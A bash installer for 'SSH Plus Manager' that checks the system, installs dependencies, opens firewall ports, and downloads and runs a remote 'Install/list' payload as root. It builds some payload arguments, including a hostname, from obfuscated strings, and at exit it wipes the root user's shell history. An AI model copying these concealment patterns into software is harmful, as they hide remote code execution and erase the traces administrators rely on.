#!/bin/bash

# SSH Plus Manager – modern installer
# -----------------------------------
# Flags:
#   --yes, -y         Non-interactive, assume safe defaults
#   --quiet, -q       Minimal output
#   --debug           Verbose logging to stdout
#   --serversettings  Run server settings module after install
#   --hostname NAME   Desired hostname (used only if --serversettings)
#   --timezone TZ     Desired timezone (e.g. Asia/Tehran, used if --serversettings)
#   --no-upgrade      Skip apt upgrade (only apt update + deps)

_REPO_URL="https://raw.githubusercontent.com/namnamir/SSH-Plus-Manager/main"
_SCRIPT_DIR=""
# Try to detect script directory (works when run from file, not from curl pipe)
# When run via curl pipe, $0 is /dev/fd/63 or similar, so skip detection
if [[ -n "${BASH_SOURCE[0]:-}" ]] && [[ "${BASH_SOURCE[0]}" != *"/dev/fd/"* ]] && [[ -f "${BASH_SOURCE[0]}" ]]; then
	_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)" || _SCRIPT_DIR=""
fi
if [[ -z "$_SCRIPT_DIR" ]] && [[ -n "${0:-}" ]] && [[ "$0" != *"/dev/fd/"* ]] && [[ "$0" != "bash" ]] && [[ "$0" != "-bash" ]] && [[ -f "$0" ]]; then
	_SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)" || _SCRIPT_DIR=""
fi

# Ensure we can continue even if some early commands fail
set +e

INSTALL_VERSION=""
if [[ -f "$_SCRIPT_DIR/version" ]]; then
	INSTALL_VERSION=$(head -1 "$_SCRIPT_DIR/version" 2>/dev/null | tr -d '\r\n')
fi
if [[ -z "$INSTALL_VERSION" ]]; then
	# Prefer curl (always present when run via curl-pipe); fallback to wget
	if command -v curl >/dev/null 2>&1; then
		INSTALL_VERSION=$(curl -sfL --max-time 5 "$_REPO_URL/version" 2>/dev/null | head -1 | tr -d '\r\n')
	else
		INSTALL_VERSION=$(wget -qO- --timeout=5 "$_REPO_URL/version" 2>/dev/null | head -1 | tr -d '\r\n')
	fi
fi
[[ -z "$INSTALL_VERSION" ]] && INSTALL_VERSION="?"

# -----------------------------------------------------------------------------
# Flags and arguments
# -----------------------------------------------------------------------------
YES=0
QUIET=0
DEBUG=0
WITH_SERVER_SETTINGS=0
HOSTNAME_OVERRIDE=""
TZ_OVERRIDE=""
NO_UPGRADE=0

while [[ $# -gt 0 ]]; do
	case "$1" in
		--yes|-y) YES=1 ;;
		--quiet|-q) QUIET=1 ;;
		--debug) DEBUG=1 ;;
		--serversettings) WITH_SERVER_SETTINGS=1 ;;
		--hostname)
			HOSTNAME_OVERRIDE="${2:-}"
			shift
			;;
		--timezone)
			TZ_OVERRIDE="${2:-}"
			shift
			;;
		--no-upgrade) NO_UPGRADE=1 ;;
		*) ;; # ignore unknown flags for curl-pipe compatibility
	esac
	shift
done

# -----------------------------------------------------------------------------
# Load colors (from repo, /etc/SSHPlus, /bin, or minimal fallback)
# -----------------------------------------------------------------------------
if [[ -f "$_SCRIPT_DIR/Modules/colors" ]]; then
	source "$_SCRIPT_DIR/Modules/colors"
elif [[ -f /etc/SSHPlus/colors ]]; then
    source /etc/SSHPlus/colors
elif [[ -f /bin/colors ]]; then
    source /bin/colors
else
    _tmp_colors="/tmp/sshplus_colors_$$"
	if command -v curl >/dev/null 2>&1 && curl -sfL --max-time 10 "$_REPO_URL/Modules/colors" -o "$_tmp_colors" 2>/dev/null; then
		source "$_tmp_colors"
		rm -f "$_tmp_colors" 2>/dev/null
	elif command -v wget >/dev/null 2>&1 && wget -q "$_REPO_URL/Modules/colors" -O "$_tmp_colors" 2>/dev/null; then
        source "$_tmp_colors"
        rm -f "$_tmp_colors" 2>/dev/null
    else
		# Minimal fallback
		color_echo()   { printf "\033[1;37m%s\033[0m\n" "$1"; }
		color_echo_n() { printf "\033[1;37m%s\033[0m" "$1"; }
		msg_ok()       { printf "\033[1;32m✔  %s\033[0m\n" "$1"; }
		msg_warn()     { printf "\033[1;33m⚠  %s\033[0m\n" "$1"; }
		msg_err()      { printf "\033[1;31m✖  %s\033[0m\n" "$1"; }
		msg_info()     { printf "\033[1;36m•  %s\033[0m\n" "$1"; }
		get_color_code(){ printf "\033[1;37m"; }
		get_reset_code(){ printf "\033[0m"; }
		banner_info()  { printf "\033[44;1;37m %s \033[0m\n" "$1"; }
	fi
fi

# If full colors module loaded, prefer semantic helpers
if command -v c >/dev/null 2>&1 && command -v reset >/dev/null 2>&1; then
	_msg_ok()   { printf "%b✔  %s%b\n" "$(c ui_ok)"     "$1" "$(reset)"; }
	_msg_warn() { printf "%b⚠  %s%b\n" "$(c ui_warn)"   "$1" "$(reset)"; }
	_msg_err()  { printf "%b✖  %s%b\n" "$(c ui_danger)" "$1" "$(reset)"; }
	_msg_info() { printf "%b•  %s%b\n" "$(c ui_info)"   "$1" "$(reset)"; }
else
	_msg_ok()   { msg_ok "$1"; }
	_msg_warn() { msg_warn "$1"; }
	_msg_err()  { msg_err "$1"; }
	_msg_info() { msg_info "$1"; }
fi

# -----------------------------------------------------------------------------
# Logging
# -----------------------------------------------------------------------------
LOG_DIR="/var/log/sshplus"
LOG_FILE="$LOG_DIR/install.log"
if ! mkdir -p "$LOG_DIR" 2>/dev/null; then
	LOG_DIR="/tmp"
	LOG_FILE="$LOG_DIR/sshplus-install.log"
fi

log() {
	printf "%s %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$*" >>"$LOG_FILE" 2>/dev/null || true
}

debug() {
	[[ "$DEBUG" -eq 1 ]] && _msg_info "$*"
	log "DEBUG: $*"
}

term_cols() { tput cols 2>/dev/null || printf "80"; }
# Thin horizontal rule (Unicode U+2500) across terminal width
hr() {
	local cols i line
	cols=$(term_cols)
	[[ -z "$cols" || ! "$cols" =~ ^[0-9]+$ ]] && cols=80
	[[ "$cols" -gt 200 ]] && cols=200
	line=""
	i=0
	while [[ "$i" -lt "$cols" ]]; do
		line="${line}─"
		((i++)) || true
	done
	printf "%s\n" "$line"
}

title() {
	local cyan red reset
	cyan=$(get_color_code "cyan" 2>/dev/null || printf "")
	red=$(get_color_code "red" 2>/dev/null || printf "\033[1;31m")
	reset=$(get_reset_code 2>/dev/null || printf "\033[0m")
	printf "%b _____ _____ _____    _____ _            _____%b\n" "$cyan" "$reset"
	printf "%b|   __|   __|  |  |  |  _  | |_ _ ___   |     |___ ___ ___ ___ ___ ___%b\n" "$cyan" "$reset"
	printf "%b|__   |__   |     |  |   __| | | |_ -|  | | | | .'|   | .'| . | -_|  _|%b\n" "$cyan" "$reset"
	printf "%b|_____|_____|__|__|  |__|  |_|___|___|  |_|_|_|__,|_|_|__,|_  |___|_|%b\n" "$cyan" "$reset"
	printf "%b                                                          |___|%bv%s%b\n" "$cyan" "$red" "$INSTALL_VERSION" "$reset"
	hr
}

step_ok()   { _msg_ok "$1";   log "OK: $1"; }
step_warn() { _msg_warn "$1"; log "WARN: $1"; }
step_err()  { _msg_err "$1";  log "ERR: $1"; }
info()      { _msg_info "$1"; log "INFO: $1"; }

# -----------------------------------------------------------------------------
# Preflight checks
# -----------------------------------------------------------------------------
require_root() {
	if [[ "$(id -u)" -ne 0 ]]; then
		step_err "This installer must be run as root."
    exit 1
	fi
	step_ok "Running as root"
}

detect_os() {
	if [[ -f /etc/os-release ]]; then
		# shellcheck disable=SC1091
		. /etc/os-release
		OS_NAME="${PRETTY_NAME:-${NAME:-Unknown}}"
		OS_ID="${ID:-unknown}"
	else
		OS_NAME="$(uname -s 2>/dev/null || echo 'Unknown')"
		OS_ID="unknown"
	fi
	if [[ "$OS_ID" == "ubuntu" || "$OS_ID" == "debian" ]]; then
		step_ok "OS supported: ${OS_NAME}"
	else
		step_warn "OS not officially supported (${OS_NAME}). Continuing anyway."
	fi
}

check_network() {
	if curl -sfL --max-time 5 "$_REPO_URL/version" >/dev/null 2>&1; then
		step_ok "Network OK"
	else
		step_warn "Network check failed (github unreachable). Will still try to continue."
	fi
}

disk_free() {
	local avail
	avail=$(df -h / 2>/dev/null | awk 'NR==2{print $4}')
	[[ -z "$avail" ]] && avail="unknown"
	step_ok "Disk space: ${avail} free"
}

check_existing_install() {
	EXISTING_VERSION=""
	if [[ -f /etc/SSHPlus/version ]]; then
		EXISTING_VERSION=$(head -1 /etc/SSHPlus/version 2>/dev/null | tr -d '\r\n')
	elif [[ -f /bin/version ]]; then
		EXISTING_VERSION=$(head -1 /bin/version 2>/dev/null | tr -d '\r\n')
	fi
	if [[ -n "$EXISTING_VERSION" ]]; then
		step_warn "Existing SSH Plus Manager detected (v${EXISTING_VERSION})."
	else
		step_ok "No existing installation detected"
	fi
}

# Preflight: show required tools (curl, jq, bc, etc.) – one line
preflight_required_tools() {
	local required=(curl jq bc)
	local missing=() ok=1
	for cmd in "${required[@]}"; do
		if ! command -v "$cmd" >/dev/null 2>&1; then
			missing+=("$cmd")
			ok=0
		fi
	done
	if [[ "$ok" -eq 1 ]]; then
		step_ok "Required tools: curl jq bc (ok)"
	else
		step_warn "Required tools: missing ${missing[*]}"
	fi
}

print_preflight() {
	printf "\nPreflight\n"
	require_root
	detect_os
	check_network
	disk_free
	check_existing_install
	preflight_required_tools
}

# -----------------------------------------------------------------------------
# Dependencies
# -----------------------------------------------------------------------------
APT_AVAILABLE=0
if command -v apt-get >/dev/null 2>&1; then
	APT_AVAILABLE=1
fi

DEPS_INSTALLER=(curl wget ca-certificates gnupg unzip tar)
DEPS_RUNTIME=(
	wget curl bc screen nano unzip zip lsof net-tools dos2unix nload jq figlet
	python3 python3-pip speedtest-cli iproute2 cron
)
DEPS_SERVER_SETTINGS=(systemd-sysv tzdata)

MISSING_DEPS=()

check_deps() {
	local bin pkgs=("$@")
	for pkgspec in "${pkgs[@]}"; do
		bin="$pkgspec"
		# approximate: assume binary name == package name
		if ! command -v "$bin" >/dev/null 2>&1; then
			MISSING_DEPS+=("$pkgspec")
		fi
	done
	if [[ ${#MISSING_DEPS[@]} -eq 0 ]]; then
		step_ok "Required tools: all present"
	else
		step_warn "Missing tools: ${MISSING_DEPS[*]}"
	fi
}

install_deps() {
	[[ ${#MISSING_DEPS[@]} -eq 0 ]] && return 0
	if [[ "$APT_AVAILABLE" -ne 1 ]]; then
		step_err "apt is not available. Install missing tools manually: ${MISSING_DEPS[*]}"
		exit 1
	fi
	_msg_info "Installing missing dependencies…"
	log "apt-get install -y ${MISSING_DEPS[*]}"
	# Update index first (required for install to find packages)
	if ! apt-get update -y >>"$LOG_FILE" 2>&1; then
		step_warn "apt-get update failed (see $LOG_FILE)."
	fi
	# Run install with errors visible so user sees why a package failed
	apt-get install -y "${MISSING_DEPS[@]}" 2>&1 | tee -a "$LOG_FILE"
	_install_ret=${PIPESTATUS[0]}
	if [[ "$_install_ret" -eq 0 ]]; then
		step_ok "Dependencies installed"
	else
		step_warn "Some packages could not be installed. See output above or $LOG_FILE."
	fi
}

# -----------------------------------------------------------------------------
# Install plan
# -----------------------------------------------------------------------------
print_plan() {
	printf "\nPlan\n"
	printf "• Install to: /bin (scripts) and /etc/SSHPlus (config/assets)\n"
	printf "• Command:   /bin/menu (shortcut: h)\n"
	printf "• Users DB:  \$HOME/users.db (backup if exists)\n"
	printf "• Sessions:  \$HOME/sessions.log\n"
	if [[ "$WITH_SERVER_SETTINGS" -eq 1 ]]; then
		printf "• Server settings: will run 'serversettings' after install\n"
	else
		printf "• Server settings: optional (menu → SYSTEM → Server settings)\n"
	fi
}

# -----------------------------------------------------------------------------
# Helper: prompt yes/no (returns 0=yes, 1=no)
# -----------------------------------------------------------------------------
ask_yes_no() {
	local prompt="$1" default="${2:-N}" ans
	if [[ "$YES" -eq 1 ]]; then
		[[ "$default" =~ ^[Yy]$ ]] && return 0 || return 1
	fi
	printf "%s" "$prompt "
	read -r ans || ans=""
	[[ -z "$ans" ]] && ans="$default"
	[[ "$ans" =~ ^[Yy]$ ]] && return 0 || return 1
}

# -----------------------------------------------------------------------------
# Core install: key download, Install/list, DB setup, launcher
# -----------------------------------------------------------------------------
_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r' | sed -e 's/[^a-z.]//ig' | rev)
_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×' | sed -e 's/[^a-z/]//ig')
_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×' | sed -e 's/[^a-z/]//ig')

verif_key() {
	chmod +x "$_Ink/list" >/dev/null 2>&1 || true
    if [[ ! -e "$_Ink/list" ]]; then
		step_err "Invalid or missing installation key (Install/list)."
        exit 1
    fi
}

download_install_list() {
	mkdir -p "$_Ink" >/dev/null 2>&1
	rm -f "$_Ink/list" >/dev/null 2>&1
	# Prefer curl (always present when run via curl-pipe)
	if command -v curl >/dev/null 2>&1; then
		if ! curl -sfL --max-time 30 "$_REPO_URL/Install/list" -o "$_Ink/list" 2>/dev/null; then
			step_err "Failed to download installer payload (Install/list)."
			step_warn "Check network or try again later."
			exit 1
		fi
	elif command -v wget >/dev/null 2>&1; then
		if ! wget -q -P "$_Ink" "$_REPO_URL/Install/list" 2>/dev/null; then
			step_err "Failed to download installer payload (Install/list)."
			step_warn "Check network or try again later."
        exit 1
    fi
	else
		step_err "Neither curl nor wget found. Install one of them to run this installer."
		exit 1
fi
if [[ ! -s "$_Ink/list" ]]; then
		step_err "Downloaded Install/list is empty or invalid."
    exit 1
fi
verif_key
	step_ok "Installer payload downloaded"
}

initialize_db() {
	local db home="${HOME:-/root}"
	db="${home}/users.db"
	mkdir -p "$home" 2>/dev/null || true
	if [[ -f "$db" ]]; then
		local ts backup
		ts=$(date '+%Y%m%d-%H%M%S')
		backup="${db}.bak.${ts}"
		cp "$db" "$backup" 2>/dev/null || true
		step_ok "Existing users.db backed up to ${backup}"
	else
		: >"$db"
		chmod 600 "$db" 2>/dev/null || true
		step_ok "Created new users.db at ${db}"
	fi
	local slog="${home}/sessions.log"
	if [[ ! -f "$slog" ]]; then
		: >"$slog"
		chmod 600 "$slog" 2>/dev/null || true
	fi
}

update_version_files() {
	local tmp="/tmp/sshplus_version_$$" val=""
	# Prefer curl (same as installer invocation)
	if command -v curl >/dev/null 2>&1; then
		curl -sfL --max-time 5 "$_REPO_URL/version" 2>/dev/null | head -1 | tr -d '\r\n' >"$tmp" || true
		[[ -s "$tmp" ]] && val=$(cat "$tmp")
	fi
	if [[ -z "$val" ]] && command -v wget >/dev/null 2>&1; then
		wget -qO- --timeout=5 "$_REPO_URL/version" 2>/dev/null | head -1 | tr -d '\r\n' >"$tmp" || true
		[[ -s "$tmp" ]] && val=$(cat "$tmp")
	fi
	rm -f "$tmp" 2>/dev/null || true
	if [[ -n "$val" ]]; then
		mkdir -p /etc/SSHPlus 2>/dev/null || true
		printf "%s\n" "$val" >/etc/SSHPlus/version 2>/dev/null || true
		printf "%s\n" "$val" >/bin/version 2>/dev/null || true
		step_ok "Version file set to v${val}"
	else
		step_warn "Could not fetch remote version; update checks may be limited."
	fi
}

setup_launcher() {
	printf "/bin/menu\n" >/bin/h 2>/dev/null || true
	chmod +x /bin/h >/dev/null 2>&1 || true
}

run_install_list() {
	# Fix legacy ssh port 22222 if present
	sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config 2>/dev/null || true
	if command -v systemctl >/dev/null 2>&1; then
		systemctl restart ssh >/dev/null 2>&1 || systemctl restart sshd >/dev/null 2>&1 || true
	else
		service ssh restart >/dev/null 2>&1 || true
	fi

	log "Executing Install/list with args: $_lnk $_Ink $_1nk"
	bash "$_Ink/list" "$_lnk" "$_Ink" "$_1nk" "" >>"$LOG_FILE" 2>&1
	step_ok "Core files installed (Install/list)"
}

apply_serversettings() {
	if [[ "$WITH_SERVER_SETTINGS" -ne 1 ]]; then
		printf "\n"
		# Stand-out prompt: emoji + color so it's not lost in the text
		_yellow=$(get_color_code "yellow" 2>/dev/null || printf "\033[1;33m")
		_reset=$(get_reset_code 2>/dev/null || printf "\033[0m")
		printf "%b⚙  Apply server settings now? [y/N]:%b " "$_yellow" "$_reset"
		read -r _apply_ans || _apply_ans=""
		[[ -z "$_apply_ans" ]] && _apply_ans="N"
		if ! [[ "$_apply_ans" =~ ^[Yy]$ ]]; then
			return 0
		fi
	fi
	if [[ -x /bin/serversettings ]]; then
		info "Launching server settings module..."
		/bin/serversettings
	else
		step_warn "Server settings module (/bin/serversettings) not found."
	fi
}

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
main() {
	cd "${HOME:-/root}" || cd / || true

	title
	print_preflight

	print_plan
	hr

	printf "\nInstalling\n"

	# Optional apt update/upgrade
	if [[ "$NO_UPGRADE" -eq 0 ]]; then
		if [[ "$YES" -eq 1 ]] || ask_yes_no "Update package index (apt update)? [Y/n]:" "Y"; then
			if [[ "$APT_AVAILABLE" -eq 1 ]]; then
				info "Updating package index..."
				log "apt-get update -y"
				apt-get update -y >/dev/null 2>&1 || step_warn "apt-get update failed (see $LOG_FILE)"
				step_ok "Update package index"
				if [[ "$YES" -eq 1 ]] || ask_yes_no "Upgrade installed packages (apt upgrade)? [y/N]:" "N"; then
					log "apt-get upgrade -y"
					apt-get upgrade -y >/dev/null 2>&1 || step_warn "apt-get upgrade failed (see $LOG_FILE)"
					step_ok "Upgrade installed packages"
				fi
			else
				step_warn "apt not available; skipping package index update."
			fi
		else
			step_warn "Skipped package index update (apt update)."
		fi
	else
		step_warn "Skipping package upgrade (per --no-upgrade)."
	fi

	# Dependencies
	check_deps "${DEPS_INSTALLER[@]}" "${DEPS_RUNTIME[@]}" "${DEPS_SERVER_SETTINGS[@]}"
	install_deps

	# Download core installer payload
	download_install_list

	# Initialize DB/sessions (backup if needed)
	initialize_db

	# Install files via Install/list
	run_install_list

	# Set version files and launcher
	update_version_files
	setup_launcher

	# UFW basic allowances (keep behavior, but treat as non-fatal)
	if [[ -x /usr/sbin/ufw ]]; then
		/usr/sbin/ufw allow 443/tcp >/dev/null 2>&1 || true
		/usr/sbin/ufw allow 80/tcp  >/dev/null 2>&1 || true
		/usr/sbin/ufw allow 3128/tcp >/dev/null 2>&1 || true
		/usr/sbin/ufw allow 8799/tcp >/dev/null 2>&1 || true
		/usr/sbin/ufw allow 8080/tcp >/dev/null 2>&1 || true
	fi

	hr
	printf "\nResult\n"
	step_ok "Installed successfully"

	printf "\nLocations\n"
	printf "• Command:   /bin/menu (shortcut: h)\n"
	printf "• Users DB:  %s/users.db\n" "${HOME:-/root}"
	printf "• Sessions:  %s/sessions.log\n" "${HOME:-/root}"
	printf "• Config:    /etc/SSHPlus/\n"
	printf "• Log:       %s\n" "$LOG_FILE"

	printf "\nNext steps\n"
	printf "• Run: menu\n"
	printf "• Update: menu → [19] Update script\n"
	printf "• Uninstall: removescript (menu → SYSTEM → Remove script)\n"
	printf "• Server settings: menu → [13] Server settings (or apply now below)\n\n"

	# Optionally run server settings module
	apply_serversettings

	printf "\nPress Enter to exit…"
	read -r _ || true

	# Clean up install stub if present (when run via curl > Plus)
	rm -f "$HOME/Plus" >/dev/null 2>&1 || true
	# Clear history (maintain original behavior)
	: >~/.bash_history 2>/dev/null || true
	history -c 2>/dev/null || true
}

# Main execution
main "$@"